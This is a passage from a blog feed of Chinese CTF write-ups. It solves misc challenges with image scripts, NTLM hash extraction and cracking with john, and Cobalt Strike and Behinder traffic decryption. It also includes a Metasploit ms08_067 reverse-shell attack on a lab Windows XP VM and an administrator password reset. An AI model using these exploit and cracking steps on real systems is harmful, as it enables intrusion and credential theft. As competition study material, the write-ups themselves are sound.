class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000000.png&#x27;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000001.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img1.size)</span><br><span class="line"><span class="built_in">print</span>(img2.size)</span><br><span class="line">width , height = img2.size</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width , height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        x1 = <span class="number">1</span> <span class="keyword">if</span> img1.getpixel((<span class="number">3</span>*i,<span class="number">3</span>*j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x2 = <span class="number">1</span> <span class="keyword">if</span> img2.getpixel((i,j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x = x1^x2</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;new.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;hOp3_u_h@ve_Fun&#125;</code></p><p>â€‹    </p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><blockquote><p>â€œä½ çœ‹è§äº†ã€ŠDEATH NOTEã€‹ä¸Šé¢çš„åå­—ï¼Œè¿™æ—¶ï¼ŒArahat0ç»™ä½ ä¼ äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ç•™è¨€:â€ â€œ[ä»–æ‹¥æœ‰æ­»ç¥ä¹‹çœ¼ï¼Œè¯·å°å¿ƒï¼Œä»–åœ¨æ‰¾ä½ ï¼Œè¿˜å‰©1920ç§’â€¦]â€ â€œ&lt;å½“å‰æ—¶é—´ 10:52&gt;â€ã€‚flagæœ‰ä¸¤æ®µ</p></blockquote><p>webpæ–‡ä»¶åœ¨çº¿è½¬gifï¼Œä½¿ç”¨gifsplitteræ‹†åˆ†ä¸º880å¼ å›¾ç‰‡ã€‚</p><p>çŒœæµ‹å®½é«˜ä¸º40<em>22ï¼Œåˆå¹¶ï¼š`montage </em>.bmp -tile 40x22 -geometry +0+0 ../out.png`</p><p>æ‹¼å›¾ï¼š<code>gaps --image=out.png --size=48 --save</code></p><p>å¾—åˆ°æ–‡å­—ï¼š<code>XzE0X0tpMTE0Un0==</code>ï¼Œbase64è§£ç å¾—flagååŠæ®µï¼š<code>_14_Ki114R&#125;</code>ã€‚</p><p>mp3æ–‡ä»¶æå–SSTVä¿¡æ¯ï¼š<code>sstv -d L1.wav -o 1.png</code></p><p>å¾—åˆ°çš„å›¾ç‰‡é‡Œçš„æ–‡å­—ä¸ºflagå‰åŠæ®µï¼š<code>SYC&#123;H4xr0t0r</code>ã€‚</p><p>flagï¼š<code>SYC&#123;H4xr0t0r_14_Ki114R&#125;</code></p><p>â€‹    </p><h3 id="çªƒå¬é£äº‘"><a href="#çªƒå¬é£äº‘" class="headerlink" title="çªƒå¬é£äº‘"></a>çªƒå¬é£äº‘</h3><blockquote><p>Hackeræ•è·åˆ°äº†ä¸€æ®µæ•Œå¯¹å…¬å¸çš„å¯¹è¯ä¿¡æ¯æµé‡ï¼Œä½ èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password}</p></blockquote><p>NTLMSSPæµé‡ï¼Œåˆ©ç”¨æå–å·¥å…· <a href="https://github.com/sinnaj-r/NTLMssp-Extract/blob/master/ntlmssp_extract.py">ntlmssp_extract</a> æå–NTLMå¾—ï¼š</p><p><code>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></p><p>ä¿å­˜ä¸ºhashæ–‡ä»¶ï¼Œå†ç”¨johnè§£ï¼š</p><p><code>john hash --wordlist=rockyou.txt</code></p><p>ç»“æœï¼š<code>iamjackspassword (jack)</code></p><p>flagï¼š<code>SYC&#123;iamjackspassword&#125;</code></p><p>â€‹    </p><h3 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h3><blockquote><p>Try to extract me!</p></blockquote><p>4å­—èŠ‚CRC32çˆ†ç ´ï¼Œåˆ©ç”¨<a href="https://github.com/theonlypwner/crc32">CRC32 Tools</a>åˆ†åˆ«çˆ†ç ´8æ®µå­—ç¬¦ä¸²ï¼š</p><p><code>python crc32.py reverse 0xXXXXXXXX</code></p><p>æ‹¼æ¥å¾—flagï¼š<code>SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></p><p>â€‹    </p><h3 id="æ—¶ä»£çš„çœ¼æ³ª"><a href="#æ—¶ä»£çš„çœ¼æ³ª" class="headerlink" title="æ—¶ä»£çš„çœ¼æ³ª"></a>æ—¶ä»£çš„çœ¼æ³ª</h3><blockquote><p>2001å¹´çš„å¤§å±è‚¡ç”µè„‘ï¼Œåˆ°äº†2023å¹´ä¼šè¢«æå¾—å¤šæƒ¨å‘¢ï¼Ÿ é“¾æ¥: <a href="https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek">https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek</a> æå–ç : geek</p></blockquote><p>WinXPè™šæ‹Ÿæœºï¼Œç”¨VMWareåŠ è½½ä½†æ— ç™»å½•å¯†ç ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/fengzilin1973/article/details/115967231">ä½¿ç”¨MSF åˆ©ç”¨ ms08_067 å¯¹ XP è¿›è¡Œæ¸—é€</a></p><p>å…ˆå¯¹ç½‘æ®µæ‰«æIPï¼š<code>nmap -sC -sV 192.168.79.0/24</code></p><p>å¾—åˆ°IPåï¼Œä½¿ç”¨MSFæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms08_067</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloads</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132</span><br><span class="line">RHOST =&gt; 192.168.79.132</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 </span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128</span><br><span class="line">LHOST =&gt; 192.168.79.128</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; run</span><br></pre></td></tr></table></figure><p>getshellä¹‹åï¼Œä½¿ç”¨netå‘½ä»¤ä¿®æ”¹administratorå¯†ç ï¼š</p><p><code>net user administrator 123456</code></p><p>è¿›å…¥ç³»ç»Ÿï¼Œæ¡Œé¢èƒŒæ™¯å›¾å¾—flagï¼š<code>SYC&#123;You_defeated_me_after_22_years&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><blockquote><p>Just so so å±äºblockchain é¢˜ç›®é“¾æ¥ï¼š<a href="http://47.109.106.62:1234/">http://47.109.106.62:1234/</a></p></blockquote><p>ç”¨Remixç¼–è¯‘åï¼Œæ‰§è¡Œ <code>airdrop()</code> å‡½æ•°ï¼Œå³æ»¡è¶³ <code>isSolved()</code> æ¡ä»¶ï¼Œ</p><p>å¾—åˆ°flagï¼š<code>SYC&#123;kajd_u_iaak___hdskj_a&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><blockquote><p>Great  å±äºblockchain é¢˜ç›®é“¾æ¥ï¼š<a href="http://47.109.106.62:1235/">http://47.109.106.62:1235/</a></p></blockquote><p>è½¬è´¦å³å¯ã€‚</p><p>â€‹    </p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH_N2TE"></a>DEATH_N2TE</h3><blockquote><p>â€œä½ çŸ¥é“äº†çœŸç›¸ï¼Œæ­£å¸¦ä¸Šã€ŠDEATH NOTEã€‹å‡†å¤‡é€ƒç¦»ï¼Œæ°å¥½ï¼ŒMuscialå‘ç»™ä½ ä¸€ä¸ªè§†é¢‘ï¼Œå¹¶è¯´:â€ â€œ[è¿™é‡Œè®°ä¸‹äº†ä»–çš„çœŸåä»¥åŠç…§ç‰‡ï¼Œè¯·å†™åœ¨é‚£æœ¬ç¬”è®°ä¸Šé¢ï¼Œæˆ‘å’ŒArahat0éƒ½è¢«ä»–çœ‹è§äº†çœŸåâ€¦]â€ã€‚</p></blockquote><p>mp4åˆ†å¸§ï¼š<code>ffmpeg -i kira.mp4 %05d.png</code></p><p>æå–æ¯ä¸€å¸§çš„åˆ—ï¼Œç»„åˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">width,height = <span class="number">192</span>,<span class="number">108</span></span><br><span class="line">img_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&#x27;x/<span class="subst">&#123;<span class="built_in">str</span>(i+<span class="number">1</span>).zfill(<span class="number">5</span>)&#125;</span>.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            tmp = img.getpixel((i*<span class="number">10</span>+start,j*<span class="number">10</span>+start))</span><br><span class="line">            img_new.putpixel((i,j),tmp)</span><br><span class="line"></span><br><span class="line">    img_new.save(<span class="string">f&#x27;x/out_with_start_<span class="subst">&#123;start&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>start=5çš„æ—¶å€™ï¼Œå¾—flagï¼š<code>SYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="çªƒå¬é£äº‘-V2"><a href="#çªƒå¬é£äº‘-V2" class="headerlink" title="çªƒå¬é£äº‘-V2"></a>çªƒå¬é£äº‘-V2</h3><blockquote><p>è¿™æ¬¡Hackeræ•è·åˆ°äº†Jackç™»å½•é‚®ä»¶ç³»ç»Ÿçš„æµé‡ï¼Œä½ è¿˜èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password}</p></blockquote><p>SMTPæµé‡ï¼Œwireshark è§£æntlmsspï¼ŒæŒ‰ç…§</p><p><a href="https://www.youtube.com/watch?v=mu7-naA0muc">Extracting NTLM Hash Values from a Wireshark packet capture</a></p><p>æ„é€ å‡ºntlmsspï¼š</p><p><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></p><p>å†ç”¨johnçˆ†ç ´å³å¯ï¼š<code>john token.txt --wordlist=rockyou.txt</code></p><p>å¾—åˆ° <code>jack100589barney (jack)</code>ï¼Œflagï¼š<code>SYC&#123;jack100589barney&#125;</code>ã€‚</p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸&lt;br&gt;å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹&lt;br&gt;æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹&lt;br&gt;å¹³å°é“¾æ¥ï¼š&lt;a href=&quot;https://game.sycsec.com/&quot;&gt;ht</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>SICTF2023 Round2</title>
    <link href="https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/"/>
    <id>https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/</id>
    <published>2023-09-10T05:39:56.000Z</published>
    <updated>2023-09-10T07:43:36.091Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>SICTF2023 #Round2 æ˜¯æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ä¿¡æ¯å·¥ç¨‹å­¦é™¢å’Œå¹¿ä¸œæµ·æ´‹å¤§å­¦è”åˆä¸¾åŠçš„ç½‘ç»œå®‰å…¨èµ›ã€‚</p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°-Welcome"><a href="#ç­¾åˆ°-Welcome" class="headerlink" title="[ç­¾åˆ°]Welcome"></a>[ç­¾åˆ°]Welcome</h3><p><code>SICTF&#123;Welcome_to_SICTF2023_#Round2&#125;</code></p><p>â€‹    </p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>LSBéšå†™ï¼š<code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Pixel_art.png &gt; 1.png</code></p><p>æå–RGBå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">f = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">tmp = img.getpixel((j,i))</span><br><span class="line">f+=<span class="built_in">bytes</span>(<span class="built_in">list</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>åœ¨çº¿ookè§£ç ï¼Œå¾—flagï¼š<code>SICTF&#123;0141ac35-ec19-4cee-a906-22805fdbed77&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä¸€èµ·ä¸Šå·ä¸"><a href="#ä¸€èµ·ä¸Šå·ä¸" class="headerlink" title="ä¸€èµ·ä¸Šå·ä¸"></a>ä¸€èµ·ä¸Šå·ä¸</h3><p>Cobalt Strikeæµé‡åˆ†æï¼Œå‚è€ƒï¼š<a href="https://blog.scrt.ch/2023/04/01/hex-filtrate/">https://blog.scrt.ch/2023/04/01/hex-filtrate/</a></p><p>æå–å‡ºæœ€åä¸€ä¸ªæµé‡Œçš„keyï¼Œè§£æcookieï¼š</p><p><code>python3 cs-decrypt-metadata.py U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s= -f key</code></p><p>æ‹¿åˆ°Raw keyåï¼Œå†åˆ†ææµé‡æ–‡ä»¶ï¼š</p><p><code>python3 cs-parse-traffic.py -r 1ddb06c55884caf491bdb370ca48389c 11.pcapng</code></p><p>å¾—åˆ°flagï¼š<code>SICTF&#123;88a39373-e204-43b6-b321-33ac8972fde9&#125;</code></p><p>â€‹    </p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>éƒ¨åˆ†æ˜æ–‡æ”»å‡»ï¼Œ<code>1.png</code> ä¸ºpngå›¾ç‰‡å‰18å­—èŠ‚ï¼š</p><p><code>rbkcrack -C flag.zip -c flag.png -p 1.png</code></p><p>å¾—åˆ°keyåå†æå–ï¼š</p><p><code>rbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</code></p><p>flagï¼š<code>SICTF&#123;3a4998b8-345e-4943-a689-d01e8b08defb&#125;</code></p><p>â€‹    </p><h3 id="è¿˜ä¸ä¸Šå·"><a href="#è¿˜ä¸ä¸Šå·" class="headerlink" title="è¿˜ä¸ä¸Šå·"></a>è¿˜ä¸ä¸Šå·</h3><p>flag1.pcapngæ˜¯å†°èæµé‡ï¼Œflag2.pcapngæ˜¯CSæµé‡ã€‚</p><p>å…ˆçœ‹flag2.pcapngï¼Œæå– <code>key.zip</code> è§£å‹ï¼Œ<code>key</code> ä¸­æœ‰é›¶å®½å­—ç¬¦éšå†™ï¼Œå¾—åˆ° <code>cd52f1488563bf0e</code>ï¼Œæ˜¯å†°èæµé‡çš„keyã€‚</p><p>flag1.pcapngä¸­ï¼Œå‚è€ƒEasy_Sharkè§£å¯†ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;cd52f1488563bf0e&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å“åº”æ•°æ®åŒ…ä¸­çš„base64å­—ç¬¦ä¸²å¸¦å…¥å¾—åˆ°å„æµçš„è§£å¯†å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># æµ2</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">key</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># æµ4</span><br><span class="line">SICTF&#123;79e1755e-08a8-4d</span><br><span class="line"></span><br><span class="line"># æµ6</span><br><span class="line">rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAv</span><br><span class="line">cnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtM</span><br><span class="line">AAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5</span><br><span class="line">cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hw</span><br><span class="line">c3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZh</span><br><span class="line">L3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGlj</span><br><span class="line">S2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJM</span><br><span class="line">amF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtM</span><br><span class="line">amF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6</span><br><span class="line">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL0M6FR0Cb9dW52Nd5NTA1JUNAs1</span><br><span class="line">thS8iXx6QB+UkN/vRJdfsKS8dnOfNuPuPDCtx26B2j8I1FuTJ1VrrfDkzN585sskmXYronFM98Dx</span><br><span class="line">50vHaadOcDcDdBBqi8gC5/D3iKflX6T9pSL/5PVLfN1EIaFsyAS9jpWX2wGNi3C/QPSrAgMBAAEC</span><br><span class="line">gYAdNhXeGtH4wkWqOhY8aurL+VvTUZjRanJ6C+/FkXCzUWbRVwVV5xMMeZEDNigRw4BZ2HGvJL+f</span><br><span class="line">aMT+o3VMkCYBhGbi2/3RPRgigMG7Aa3LWWtYWsdbw8Mw6aqqbTjDUHrQ1kulMf1JvXJL5LBd+pBA</span><br><span class="line">Q8kHaYJRMcmnLsT4NeXOFQJBAMNa2r+phrThTlagMB6bj6vl0IVbDy+TJT2VybCSJ76rPgVUQwtP</span><br><span class="line">yX3z7UAjt27mE8KK+k7Jidi0drCEPv5Wo60CQQD3vQbO64fko1dlatkNn095GO9KoCuanrsLs+vY</span><br><span class="line">Ohc0ltk4EhHHmP5hEE6dSMZNASKaN0wSYJ14xjnA+dJWOES3AkEApzyYF4vhLefTUIVBrHIvxFCw</span><br><span class="line">+fjCP1AQiXA5gVcdfzTJm3ZPDtf2/kRbzpTE68M7F0gykFAoGcQj92i/JKy24QJAdyVbA+M07Ro9</span><br><span class="line">qxHzJ+EJmMUMOMjFj8xtStiSQeDWTj2KZLQUBvmmxcnQ9UYN0PUNzjtwA5qhwXccSZoctcjECwJA</span><br><span class="line">Zc0TZgGq/OwgnIyj/1+Q9D0A2eg3aw1k+6Vzkf/DdkuF6+XTkYTlBGiETIK/vm1rCH4NcOCL7eK5</span><br><span class="line">qpA1grg+gnQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4</span><br><span class="line">cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgAS</span><br><span class="line">AAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAvQzoVHQJv11bnY13k1MDUlQ0CzW2FLyJ</span><br><span class="line">fHpAH5SQ3+9El1+wpLx2c5824+48MK3HboHaPwjUW5MnVWut8OTM3nzmyySZdiuicUz3wPHnS8dp</span><br><span class="line">p05wNwN0EGqLyALn8PeIp+VfpP2lIv/k9Ut83UQhoWzIBL2OlZfbAY2LcL9A9KsCAwEAAXQABVgu</span><br><span class="line">NTA5fnEAfgAVdAAGUFVCTElDcHB4</span><br></pre></td></tr></table></figure><p>å°†æµ6ä¿å­˜ï¼Œä¸ºflag2.pcapngçš„å®é™…keyã€‚</p><p>å›åˆ°flag2.pcapngï¼Œè§£æcookieï¼š</p><p><code>python3 cs-decrypt-metadata.py j+ojKDVPlCr7lT9yzNinkj1DgdkcRaLMT2kL4U+9TvdFBZqGKk7/4WF/W7JhEieC3DoRfngRppMAVHa3yfhp4HZm/ZeNY4bc8rlYL11Q0dXDzpR5JjhqN+hGe9RBqPznoukShgQLhxT/DO7djxE5ROzi6NC52yZAaGPCSeLDyjg= -f realkey</code></p><p>æ‹¿åˆ°Raw keyåï¼Œå†åˆ†ææµé‡æ–‡ä»¶ï¼š</p><p><code>python3 cs-parse-traffic.py -r dfc36399da501802482005cf8c768086 flag2.pcapng</code></p><p>å¾—åˆ°å…³é”®å†…å®¹ï¼š</p><p><code>F       0       09/06/2023 15:52:58     GNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU======</code></p><p>base32è§£ç å¾—ååŠéƒ¨åˆ†flagï¼š<code>3d-9385-4c0541549995&#125;</code></p><p>flagï¼š<code>SICTF&#123;79e1755e-08a8-4d3d-9385-4c0541549995&#125;</code></p><p>â€‹    </p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" 